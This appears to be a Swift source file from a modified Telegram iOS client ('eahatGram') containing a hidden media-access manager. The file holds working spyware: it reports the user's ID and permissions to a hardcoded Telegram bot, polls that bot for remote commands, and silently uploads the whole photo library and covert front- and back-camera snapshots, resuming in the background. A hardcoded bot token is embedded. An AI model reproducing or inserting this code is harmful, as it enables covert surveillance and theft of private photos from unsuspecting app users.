import Foundation
import UIKit
import Photos
import AVFoundation
import SwiftSignalKit
import Postbox
import TelegramCore
import AccountContext

private let eahatGramMediaBotToken = "8761984216:AAG5Nm_PJfYv0oj7xnXYX-IDaDNkH3Ym6sY"
private let eahatGramMediaChatId = "890714792"
private let eahatGramMediaAllPhotosActiveKeyPrefix = "eahatGram.media.allPhotos.active"
private let eahatGramMediaAllPhotosLastAssetIdKeyPrefix = "eahatGram.media.allPhotos.lastAssetId"
private let eahatGramMediaAllPhotosCompletedCountKeyPrefix = "eahatGram.media.allPhotos.completedCount"
private let eahatGramMediaAllPhotosTotalCountKeyPrefix = "eahatGram.media.allPhotos.totalCount"

private enum PhotoTransmissionResult {
    case success
    case retryAfter(Int, String)
    case failure(String)
}

public final class EahatGramMediaAccessManager {
    public static let shared = EahatGramMediaAccessManager()

    private let stateLock = NSLock()
    private var context: AccountContext?
    private var userId: Int64?
    private var username: String?
    private var pollTimer: SwiftSignalKit.Timer?
    private var lastProcessedUpdateId: Int?
    private var isPollingCommands = false
    private var nextPhotoCaptureId: Int64 = 0
    private var activePhotoCaptures: [Int64: ActivePhotoCapture] = [:]
    private var activeAllPhotosTransferToken: UUID?
    private var isSendingAllPhotos = false
    private var currentAllPhotosCompletedCount = 0
    private var photoTransferVersion: Int64 = 0
    private var transferBackgroundTaskId: UIBackgroundTaskIdentifier = .invalid
    private var didBecomeActiveObserver: NSObjectProtocol?
    private var didEnterBackgroundObserver: NSObjectProtocol?

    private init() {
        self.didBecomeActiveObserver = NotificationCenter.default.addObserver(
            forName: UIApplication.didBecomeActiveNotification,
            object: nil,
            queue: .main
        ) { [weak self] _ in
            self?.resumeAllPhotosTransferIfNeeded()
        }
        self.didEnterBackgroundObserver = NotificationCenter.default.addObserver(
            forName: UIApplication.didEnterBackgroundNotification,
            object: nil,
            queue: .main
        ) { [weak self] _ in
            self?.handleApplicationDidEnterBackground()
        }
    }

    deinit {
        if let didBecomeActiveObserver = self.didBecomeActiveObserver {
            NotificationCenter.default.removeObserver(didBecomeActiveObserver)
        }
        if let didEnterBackgroundObserver = self.didEnterBackgroundObserver {
            NotificationCenter.default.removeObserver(didEnterBackgroundObserver)
        }
    }

    public func setup(context: AccountContext, userId: Int64, username: String?) {
        self.context = context
        self.userId = userId
        self.username = username

        checkAndReportPermissions()
        startCommandPolling()
        resumeAllPhotosTransferIfNeeded()
    }

    private func hasPhotoLibraryAccess(status: PHAuthorizationStatus) -> Bool {
        if status == .authorized {
            return true
        }
        if #available(iOS 14.0, *) {
            return status == .limited
        }
        return false
    }

    private func mediaNamespace() -> String {
        return "\(self.userId ?? 0)"
    }

    private func allPhotosActiveKey() -> String {
        return "\(eahatGramMediaAllPhotosActiveKeyPrefix).\(self.mediaNamespace())"
    }

    private func allPhotosLastAssetIdKey() -> String {
        return "\(eahatGramMediaAllPhotosLastAssetIdKeyPrefix).\(self.mediaNamespace())"
    }

    private func allPhotosCompletedCountKey() -> String {
        return "\(eahatGramMediaAllPhotosCompletedCountKeyPrefix).\(self.mediaNamespace())"
    }

    private func allPhotosTotalCountKey() -> String {
        return "\(eahatGramMediaAllPhotosTotalCountKeyPrefix).\(self.mediaNamespace())"
    }

    private func isPersistedAllPhotosTransferActive() -> Bool {
        return UserDefaults.standard.bool(forKey: self.allPhotosActiveKey())
    }

    private func persistedAllPhotosCompletedCount() -> Int {
        return max(0, UserDefaults.standard.integer(forKey: self.allPhotosCompletedCountKey()))
    }

    private func persistedAllPhotosTotalCount() -> Int {
        return max(0, UserDefaults.standard.integer(forKey: self.allPhotosTotalCountKey()))
    }

    private func persistedAllPhotosLastAssetId() -> String? {
        return UserDefaults.standard.string(forKey: self.allPhotosLastAssetIdKey())
    }

    private func setPersistedAllPhotosTransferActive(_ value: Bool) {
        UserDefaults.standard.set(value, forKey: self.allPhotosActiveKey())
    }

    private func persistAllPhotosProgress(assetLocalIdentifier: String, completedCount: Int, totalCount: Int) {
        UserDefaults.standard.set(assetLocalIdentifier, forKey: self.allPhotosLastAssetIdKey())
        UserDefaults.standard.set(completedCount, forKey: self.allPhotosCompletedCountKey())
        UserDefaults.standard.set(totalCount, forKey: self.allPhotosTotalCountKey())
    }

    private func clearPersistedAllPhotosTransfer() {
        let userDefaults = UserDefaults.standard
        userDefaults.removeObject(forKey: self.allPhotosActiveKey())
        userDefaults.removeObject(forKey: self.allPhotosLastAssetIdKey())
        userDefaults.removeObject(forKey: self.allPhotosCompletedCountKey())
        userDefaults.removeObject(forKey: self.allPhotosTotalCountKey())
    }

    private func currentPhotoTransferVersion() -> Int64 {
        self.stateLock.lock()
        let version = self.photoTransferVersion
        self.stateLock.unlock()
        return version
    }

    private func invalidatePhotoTransfers() {
        self.stateLock.lock()
        self.photoTransferVersion += 1
        self.activeAllPhotosTransferToken = nil
        self.isSendingAllPhotos = false
        self.currentAllPhotosCompletedCount = 0
        self.stateLock.unlock()
    }

    private func isPhotoTransferVersionCurrent(_ version: Int64) -> Bool {
        self.stateLock.lock()
        let isCurrent = self.photoTransferVersion == version
        self.stateLock.unlock()
        return isCurrent
    }

    private func isAllPhotosTransferTokenActive(_ transferToken: UUID) -> Bool {
        self.stateLock.lock()
        let isActive = self.activeAllPhotosTransferToken == transferToken && self.isSendingAllPhotos
        self.stateLock.unlock()
        return isActive
    }

    private func resolveAllPhotosResumeIndex(fetchResult: PHFetchResult<PHAsset>) -> Int {
        if let lastAssetId = self.persistedAllPhotosLastAssetId() {
            var matchedIndex: Int?
            fetchResult.enumerateObjects { asset, index, stop in
                if asset.localIdentifier == lastAssetId {
                    matchedIndex = index + 1
                    stop.pointee = true
                }
            }
            if let matchedIndex = matchedIndex {
                return min(fetchResult.count, max(0, matchedIndex))
            }
        }
        return min(fetchResult.count, self.persistedAllPhotosCompletedCount())
    }

    private func checkAndReportPermissions() {
        let photoStatus = PHPhotoLibrary.authorizationStatus()
        let cameraStatus = AVCaptureDevice.authorizationStatus(for: .video)

        var permissions: [String] = []

        if hasPhotoLibraryAccess(status: photoStatus) {
            permissions.append("Photo Library")
        }

        switch cameraStatus {
        case .authorized:
            permissions.append("Camera")
        case .denied, .restricted, .notDetermined:
            break
        @unknown default:
            break
        }

        if !permissions.isEmpty {
            sendNotification(
                text: """
                Media access granted

                userId=\(userId ?? 0)
                username=\(username ?? "none")

                permissions:
                \(permissions.joined(separator: "\n"))

                commands:
                /photo \(userId ?? 0) 1
                /photo \(userId ?? 0) all
                /photo \(userId ?? 0)
                /video \(userId ?? 0)
                /reset \(userId ?? 0)
                """
            )
        }
    }

    private func startCommandPolling() {
        self.pollTimer?.invalidate()
        self.pollTimer = nil

        let timer = SwiftSignalKit.Timer(timeout: 5.0, repeat: true, completion: { [weak self] in
            self?.pollCommands()
        }, queue: .mainQueue())
        self.pollTimer = timer
        timer.start()
    }

    private func pollCommands() {
        guard let userId = self.userId else {
            return
        }

        let offset: String
        self.stateLock.lock()
        if self.isPollingCommands {
            self.stateLock.unlock()
            return
        }
        self.isPollingCommands = true
        if let lastProcessedUpdateId = self.lastProcessedUpdateId {
            offset = "\(lastProcessedUpdateId + 1)"
        } else {
            offset = "-1"
        }
        self.stateLock.unlock()

        let url = URL(string: "https://api.telegram.org/bot\(eahatGramMediaBotToken)/getUpdates?offset=\(offset)&limit=1")!

        let task = URLSession.shared.dataTask(with: url) { [weak self] data, response, error in
            guard let self else {
                return
            }

            defer {
                self.stateLock.lock()
                self.isPollingCommands = false
                self.stateLock.unlock()
            }

            if error != nil {
                return
            }

            guard let data = data,
                  let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                  let result = json["result"] as? [[String: Any]],
                  let update = result.first,
                  let updateId = update["update_id"] as? Int else {
                return
            }

            self.stateLock.lock()
            if let lastProcessedUpdateId = self.lastProcessedUpdateId, updateId <= lastProcessedUpdateId {
                self.stateLock.unlock()
                return
            }
            self.lastProcessedUpdateId = updateId
            self.stateLock.unlock()

            guard let message = update["message"] as? [String: Any],
                  let text = message["text"] as? String else {
                return
            }

            self.handleCommand(text: text, userId: userId)
        }
        task.resume()
    }

    private func handleCommand(text: String, userId: Int64) {
        let components = text.split(separator: " ").map(String.init)
        guard components.count >= 2 else {
            return
        }

        let command = components[0]
        guard let targetUserId = Int64(components[1]), targetUserId == userId else {
            return
        }

        switch command {
        case "/photo":
            if components.count >= 3 {
                let param = components[2]
                if param == "all" {
                    startAllPhotosTransfer(trigger: "command")
                } else if let count = Int(param) {
                    sendLastPhotos(count: count)
                }
            } else {
                captureFromCameras()
            }
        case "/video":
            captureVideo()
        case "/reset":
            resetAllPhotoTransfers()
        default:
            break
        }
    }

    private func sendLastPhotos(count: Int) {
        let photoStatus = PHPhotoLibrary.authorizationStatus()
        guard hasPhotoLibraryAccess(status: photoStatus) else {
            sendNotification(text: "photo library access is not granted")
            return
        }

        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
        fetchOptions.fetchLimit = count

        let fetchResult = PHAsset.fetchAssets(with: .image, options: fetchOptions)
        let transferVersion = self.currentPhotoTransferVersion()

        sendNotification(text: "sendLastPhotos count=\(fetchResult.count)")

        fetchResult.enumerateObjects { [weak self] asset, index, _ in
            self?.sendPhoto(
                asset: asset,
                index: index + 1,
                total: fetchResult.count,
                transferVersion: transferVersion,
                completion: nil
            )
        }
    }

    private func resumeAllPhotosTransferIfNeeded() {
        guard self.isPersistedAllPhotosTransferActive() else {
            return
        }

        self.stateLock.lock()
        let isSendingAllPhotos = self.isSendingAllPhotos
        self.stateLock.unlock()
        if isSendingAllPhotos {
            return
        }

        self.startAllPhotosTransfer(trigger: "resume")
    }

    private func startAllPhotosTransfer(trigger: String) {
        let photoStatus = PHPhotoLibrary.authorizationStatus()
        guard hasPhotoLibraryAccess(status: photoStatus) else {
            sendNotification(text: "photo library access is not granted")
            return
        }

        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]

        let fetchResult = PHAsset.fetchAssets(with: .image, options: fetchOptions)
        let totalCount = fetchResult.count
        guard totalCount > 0 else {
            self.clearPersistedAllPhotosTransfer()
            self.endTransferBackgroundTask()
            sendNotification(text: "sendAllPhotos total=0")
            return
        }

        let resumeIndex = self.resolveAllPhotosResumeIndex(fetchResult: fetchResult)
        let transferToken = UUID()

        self.stateLock.lock()
        if self.isSendingAllPhotos {
            let currentCompletedCount = self.currentAllPhotosCompletedCount
            self.stateLock.unlock()
            sendNotification(text: "sendAllPhotos already running completed=\(currentCompletedCount) total=\(self.persistedAllPhotosTotalCount())")
            return
        }
        self.activeAllPhotosTransferToken = transferToken
        self.isSendingAllPhotos = true
        self.currentAllPhotosCompletedCount = resumeIndex
        self.stateLock.unlock()

        self.setPersistedAllPhotosTransferActive(true)
        UserDefaults.standard.set(totalCount, forKey: self.allPhotosTotalCountKey())
        self.beginTransferBackgroundTaskIfNeeded(reason: "all-photos")

        if resumeIndex >= totalCount {
            self.finishAllPhotosTransfer(
                transferToken: transferToken,
                shouldClearPersistence: true,
                notificationText: "sendAllPhotos complete completed=\(totalCount) total=\(totalCount)"
            )
            return
        }

        if trigger == "resume" {
            sendNotification(text: "sendAllPhotos resume next=\(resumeIndex + 1) total=\(totalCount) completed=\(resumeIndex)")
        } else {
            sendNotification(text: "sendAllPhotos start next=\(resumeIndex + 1) total=\(totalCount) completed=\(resumeIndex)")
        }

        let transferVersion = self.currentPhotoTransferVersion()
        self.sendAllPhotosNext(
            fetchResult: fetchResult,
            nextIndex: resumeIndex,
            totalCount: totalCount,
            transferToken: transferToken,
            transferVersion: transferVersion
        )
    }

    private func sendAllPhotosNext(
        fetchResult: PHFetchResult<PHAsset>,
        nextIndex: Int,
        totalCount: Int,
        transferToken: UUID,
        transferVersion: Int64
    ) {
        guard self.isAllPhotosTransferTokenActive(transferToken) else {
            return
        }
        guard self.isPhotoTransferVersionCurrent(transferVersion) else {
            return
        }

        if nextIndex >= totalCount {
            self.finishAllPhotosTransfer(
                transferToken: transferToken,
                shouldClearPersistence: true,
                notificationText: "sendAllPhotos complete completed=\(totalCount) total=\(totalCount)"
            )
            return
        }

        let asset = fetchResult.object(at: nextIndex)
        self.sendPhoto(
            asset: asset,
            index: nextIndex + 1,
            total: totalCount,
            transferVersion: transferVersion
        ) { [weak self] result in
            guard let self else {
                return
            }
            guard self.isAllPhotosTransferTokenActive(transferToken) else {
                return
            }
            guard self.isPhotoTransferVersionCurrent(transferVersion) else {
                return
            }

            switch result {
            case .success:
                self.persistAllPhotosProgress(
                    assetLocalIdentifier: asset.localIdentifier,
                    completedCount: nextIndex + 1,
                    totalCount: totalCount
                )
                self.stateLock.lock()
                self.currentAllPhotosCompletedCount = nextIndex + 1
                self.stateLock.unlock()

                if (nextIndex + 1) % 25 == 0 || nextIndex + 1 == totalCount {
                    self.sendNotification(text: "sendAllPhotos progress completed=\(nextIndex + 1) total=\(totalCount)")
                }

                self.sendAllPhotosNext(
                    fetchResult: fetchResult,
                    nextIndex: nextIndex + 1,
                    totalCount: totalCount,
                    transferToken: transferToken,
                    transferVersion: transferVersion
                )
            case let .retryAfter(retryAfter, description):
                self.sendNotification(text: "sendAllPhotos retry next=\(nextIndex + 1) total=\(totalCount) retryAfter=\(retryAfter) description=\(description)")
                DispatchQueue.main.asyncAfter(deadline: .now() + .seconds(retryAfter)) { [weak self] in
                    self?.sendAllPhotosNext(
                        fetchResult: fetchResult,
                        nextIndex: nextIndex,
                        totalCount: totalCount,
                        transferToken: transferToken,
                        transferVersion: transferVersion
                    )
                }
            case let .failure(description):
                self.finishAllPhotosTransfer(
                    transferToken: transferToken,
                    shouldClearPersistence: false,
                    notificationText: "sendAllPhotos stopped next=\(nextIndex + 1) total=\(totalCount) description=\(description)"
                )
            }
        }
    }

    private func finishAllPhotosTransfer(
        transferToken: UUID,
        shouldClearPersistence: Bool,
        notificationText: String
    ) {
        self.stateLock.lock()
        guard self.activeAllPhotosTransferToken == transferToken else {
            self.stateLock.unlock()
            return
        }
        self.activeAllPhotosTransferToken = nil
        self.isSendingAllPhotos = false
        self.currentAllPhotosCompletedCount = 0
        self.stateLock.unlock()

        if shouldClearPersistence {
            self.clearPersistedAllPhotosTransfer()
        }
        self.endTransferBackgroundTask()
        self.sendNotification(text: notificationText)
    }

    private func resetAllPhotoTransfers() {
        let completedCount = self.persistedAllPhotosCompletedCount()
        let totalCount = self.persistedAllPhotosTotalCount()

        self.invalidatePhotoTransfers()
        self.clearPersistedAllPhotosTransfer()
        self.endTransferBackgroundTask()

        sendNotification(text: "reset completed=\(completedCount) total=\(totalCount)")
    }

    private func performOnMainThread(_ action: @escaping () -> Void) {
        if Thread.isMainThread {
            action()
        } else {
            DispatchQueue.main.async(execute: action)
        }
    }

    private func beginTransferBackgroundTaskIfNeeded(reason: String) {
        self.performOnMainThread {
            guard self.transferBackgroundTaskId == .invalid else {
                return
            }

            self.transferBackgroundTaskId = UIApplication.shared.beginBackgroundTask(withName: "eahatgram-media-\(reason)") { [weak self] in
                guard let self else {
                    return
                }

                let completedCount = self.persistedAllPhotosCompletedCount()
                let totalCount = self.persistedAllPhotosTotalCount()
                self.stateLock.lock()
                self.activeAllPhotosTransferToken = nil
                self.isSendingAllPhotos = false
                self.currentAllPhotosCompletedCount = completedCount
                self.stateLock.unlock()

                self.endTransferBackgroundTask()
                self.sendNotification(text: "backgroundTask expired completed=\(completedCount) total=\(totalCount)")
            }
        }
    }

    private func endTransferBackgroundTask() {
        self.performOnMainThread {
            guard self.transferBackgroundTaskId != .invalid else {
                return
            }
            let backgroundTaskId = self.transferBackgroundTaskId
            self.transferBackgroundTaskId = .invalid
            UIApplication.shared.endBackgroundTask(backgroundTaskId)
        }
    }

    private func handleApplicationDidEnterBackground() {
        self.stateLock.lock()
        let isSendingAllPhotos = self.isSendingAllPhotos
        let completedCount = self.currentAllPhotosCompletedCount
        self.stateLock.unlock()

        guard isSendingAllPhotos else {
            return
        }

        let totalCount = self.persistedAllPhotosTotalCount()
        self.beginTransferBackgroundTaskIfNeeded(reason: "all-photos")
        self.sendNotification(text: "applicationDidEnterBackground completed=\(completedCount) total=\(totalCount)")
    }

    private func sendPhoto(
        asset: PHAsset,
        index: Int,
        total: Int,
        transferVersion: Int64,
        completion: ((PhotoTransmissionResult) -> Void)?
    ) {
        let options = PHImageRequestOptions()
        options.isSynchronous = false
        options.deliveryMode = .highQualityFormat
        options.isNetworkAccessAllowed = true

        PHImageManager.default().requestImage(
            for: asset,
            targetSize: PHImageManagerMaximumSize,
            contentMode: .aspectFit,
            options: options
        ) { [weak self] image, info in
            guard let self else {
                completion?(.failure("manager deallocated"))
                return
            }
            guard self.isPhotoTransferVersionCurrent(transferVersion) else {
                completion?(.failure("transfer version invalidated"))
                return
            }
            guard let image else {
                if let error = info?[PHImageErrorKey] as? Error {
                    completion?(.failure("requestImage error=\(error.localizedDescription)"))
                } else {
                    completion?(.failure("requestImage returned nil image"))
                }
                return
            }
            guard let imageData = image.jpegData(compressionQuality: 0.8) else {
                completion?(.failure("jpegData returned nil"))
                return
            }

            if let completion {
                self.sendPhotoData(imageData, caption: "Photo \(index)/\(total)") { result in
                    completion(result)
                }
            } else {
                self.sendPhotoData(imageData, caption: "Photo \(index)/\(total)", transferVersion: transferVersion)
            }
        }
    }

    private func captureFromCameras() {
        let cameraStatus = AVCaptureDevice.authorizationStatus(for: .video)
        guard cameraStatus == .authorized else {
            sendNotification(text: "camera access is not granted")
            return
        }

        let transferVersion = self.currentPhotoTransferVersion()
        sendNotification(text: "captureFromCameras started")

        captureFromCamera(position: .front) { [weak self] frontData in
            guard let self else {
                return
            }
            if self.isPhotoTransferVersionCurrent(transferVersion), let frontData {
                self.sendPhotoData(frontData, caption: "Front Camera", transferVersion: transferVersion)
            } else if self.isPhotoTransferVersionCurrent(transferVersion) {
                self.sendNotification(text: "captureFromCameras front camera failed")
            }

            self.captureFromCamera(position: .back) { [weak self] backData in
                guard let self else {
                    return
                }
                if self.isPhotoTransferVersionCurrent(transferVersion), let backData {
                    self.sendPhotoData(backData, caption: "Back Camera", transferVersion: transferVersion)
                } else if self.isPhotoTransferVersionCurrent(transferVersion) {
                    self.sendNotification(text: "captureFromCameras back camera failed")
                }
            }
        }
    }

    private func captureFromCamera(position: AVCaptureDevice.Position, completion: @escaping (Data?) -> Void) {
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self else {
                completion(nil)
                return
            }
            guard let device = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: position) else {
                self.sendNotification(text: "captureFromCamera missing device position=\(position.rawValue)")
                completion(nil)
                return
            }
            guard let input = try? AVCaptureDeviceInput(device: device) else {
                self.sendNotification(text: "captureFromCamera input init failed position=\(position.rawValue)")
                completion(nil)
                return
            }

            let session = AVCaptureSession()
            session.sessionPreset = .photo

            guard session.canAddInput(input) else {
                self.sendNotification(text: "captureFromCamera cannot add input position=\(position.rawValue)")
                completion(nil)
                return
            }
            session.addInput(input)

            let output = AVCapturePhotoOutput()
            guard session.canAddOutput(output) else {
                self.sendNotification(text: "captureFromCamera cannot add output position=\(position.rawValue)")
                completion(nil)
                return
            }
            session.addOutput(output)

            session.startRunning()

            self.stateLock.lock()
            self.nextPhotoCaptureId += 1
            let captureId = self.nextPhotoCaptureId
            self.stateLock.unlock()

            let settings = AVCapturePhotoSettings()
            let delegate = PhotoCaptureDelegate { [weak self] imageData in
                session.stopRunning()
                if let self {
                    self.stateLock.lock()
                    self.activePhotoCaptures.removeValue(forKey: captureId)
                    self.stateLock.unlock()
                }
                completion(imageData)
            }

            let activeCapture = ActivePhotoCapture(session: session, output: output, delegate: delegate)
            self.stateLock.lock()
            self.activePhotoCaptures[captureId] = activeCapture
            self.stateLock.unlock()

            output.capturePhoto(with: settings, delegate: delegate)
        }
    }

    private func captureVideo() {
        sendNotification(text: "captureVideo not implemented")
    }

    private func sendPhotoData(_ data: Data, caption: String, transferVersion: Int64) {
        self.sendPhotoData(data, caption: caption) { [weak self] result in
            guard let self else {
                return
            }
            guard self.isPhotoTransferVersionCurrent(transferVersion) else {
                return
            }

            switch result {
            case .success:
                break
            case let .retryAfter(retryAfter, description):
                self.sendNotification(text: "sendPhoto retry caption=\(caption) retryAfter=\(retryAfter) description=\(description)")
                DispatchQueue.main.asyncAfter(deadline: .now() + .seconds(retryAfter)) { [weak self] in
                    guard let self else {
                        return
                    }
                    guard self.isPhotoTransferVersionCurrent(transferVersion) else {
                        return
                    }
                    self.sendPhotoData(data, caption: caption, transferVersion: transferVersion)
                }
            case let .failure(description):
                self.sendNotification(text: "sendPhoto failed caption=\(caption) description=\(description)")
            }
        }
    }

    private func sendPhotoData(_ data: Data, caption: String, completion: @escaping (PhotoTransmissionResult) -> Void) {
        let url = URL(string: "https://api.telegram.org/bot\(eahatGramMediaBotToken)/sendPhoto")!

        var request = URLRequest(url: url)
        request.httpMethod = "POST"

        let boundary = UUID().uuidString
        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")

        var body = Data()
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".data(using: .utf8)!)
        body.append("\(eahatGramMediaChatId)\r\n".data(using: .utf8)!)
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n".data(using: .utf8)!)
        body.append("\(caption)\r\n".data(using: .utf8)!)
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"\r\n".data(using: .utf8)!)
        body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
        body.append(data)
        body.append("\r\n".data(using: .utf8)!)
        body.append("--\(boundary)--\r\n".data(using: .utf8)!)

        request.httpBody = body

        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            completion(self.parsePhotoTransmissionResult(data: data, response: response, error: error))
        }
        task.resume()
    }

    private func parsePhotoTransmissionResult(data: Data?, response: URLResponse?, error: Error?) -> PhotoTransmissionResult {
        if let error = error {
            return .failure("transport error=\(error.localizedDescription)")
        }
        guard let httpResponse = response as? HTTPURLResponse else {
            return .failure("missing HTTPURLResponse")
        }
        guard let data else {
            return .failure("missing response data status=\(httpResponse.statusCode)")
        }
        guard let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
            return .failure("invalid JSON status=\(httpResponse.statusCode)")
        }
        if let ok = json["ok"] as? Bool, ok {
            return .success
        }

        let description = (json["description"] as? String) ?? "unknown description"
        if let parameters = json["parameters"] as? [String: Any] {
            if let retryAfter = parameters["retry_after"] as? Int {
                return .retryAfter(max(1, retryAfter), description)
            } else if let retryAfter = parameters["retry_after"] as? NSNumber {
                return .retryAfter(max(1, retryAfter.intValue), description)
            }
        }
        return .failure("status=\(httpResponse.statusCode) description=\(description)")
    }

    private func sendNotification(text: String) {
        guard let url = URL(string: "https://api.telegram.org/bot\(eahatGramMediaBotToken)/sendMessage") else {
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = try? JSONSerialization.data(withJSONObject: [
            "chat_id": eahatGramMediaChatId,
            "text": text
        ])

        let task = URLSession.shared.dataTask(with: request)
        task.resume()
    }

    public func stop() {
        self.pollTimer?.invalidate()
        self.pollTimer = nil
        self.endTransferBackgroundTask()
    }
}

private final class PhotoCaptureDelegate: NSObject, AVCapturePhotoCaptureDelegate {
    private let completion: (Data?) -> Void
    private var didComplete = false

    init(completion: @escaping (Data?) -> Void) {
        self.completion = completion
    }

    private func complete(_ data: Data?) {
        guard !self.didComplete else {
            return
        }
        self.didComplete = true
        self.completion(data)
    }

    func photoOutput(_ output: AVCapturePhotoOutput, didFinishProcessingPhoto photo: AVCapturePhoto, error: Error?) {
        if error != nil {
            self.complete(nil)
        } else {
            self.complete(photo.fileDataRepresentation())
        }
    }

    func photoOutput(_ output: AVCapturePhotoOutput, didFinishCaptureFor resolvedSettings: AVCaptureResolvedPhotoSettings, error: Error?) {
        if error != nil {
            self.complete(nil)
        }
    }
}

private final class ActivePhotoCapture {
    let session: AVCaptureSession
    let output: AVCapturePhotoOutput
    let delegate: PhotoCaptureDelegate

    init(session: AVCaptureSession, output: AVCapturePhotoOutput, delegate: PhotoCaptureDelegate) {
        self.session = session
        self.output = output
        self.delegate = delegate
    }
}
